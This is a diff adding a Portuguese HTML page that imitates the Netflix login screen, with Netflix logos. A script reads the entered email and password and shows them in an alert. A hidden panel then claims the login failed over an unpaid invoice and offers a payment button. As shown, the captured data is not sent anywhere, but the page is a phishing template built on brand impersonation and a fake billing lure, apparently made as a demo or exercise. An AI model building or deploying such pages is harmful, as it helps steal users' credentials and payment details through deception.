@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/0/0c/Netflix_2015_N_logo.svg/330px-Netflix_2015_N_logo.svg.png" type="image/png">
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Página de Login Netflix</title>
+    <link rel="stylesheet" href="css.css"> <!-- Referência ao arquivo CSS -->
+    <style>
+        /* Adicionando margens para espaçamento */
+        input[type="password"], button {
+            margin-bottom: 20px; /* Espaço abaixo da caixa de senha e do botão */
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container" id="loginContainer">
+        <div class="login-box">
+            <h1>Entrar</h1>
+            <form id="loginForm" onsubmit="return mostrarAlerta();">
+                <input type="email" id="email" placeholder="Email ou número de telefone" required>
+                <input type="password" id="password" placeholder="Senha" required>
+                <button type="submit">Entrar</button>
+                <div class="signup" style="margin-top: 20px;"> <!-- Adicionando margem acima do texto de cadastro -->
+                    <p>Novo por aqui? <a href="cadastro.html">Assine agora</a></p>
+                </div>
+            </form>
+        </div>
+    </div>
+    
+    <div id="messageContainer" class="hidden">
+        <div class="message-box">
+            <a id="backButton" class="back-button">Voltar</a>
+            <h2>⚠️ Aviso</h2>
+            <p>Não foi possível entrar. Você precisa realizar o pagamento da sua fatura para continuar usando o serviço.</p>
+            <button id="payButton">Realizar Pagamento</button>
+        </div>
+    </div>
+
+    <script src="js.js"></script> <!-- Referência ao arquivo JavaScript -->
+</body>
+<img src="https://logopng.com.br/logos/netflix-94.png" alt="Logo" class="logo">
+
+<script>
+function mostrarAlerta() {
+    var email = document.getElementById("email").value;
+    var senha = document.getElementById("password").value;
+
+    var mensagem = "Email: " + email + "\nSenha: " + senha;
+
+    alert(mensagem);
+    return false; // Impede o envio do formulário
+}
+</script>
+</html>
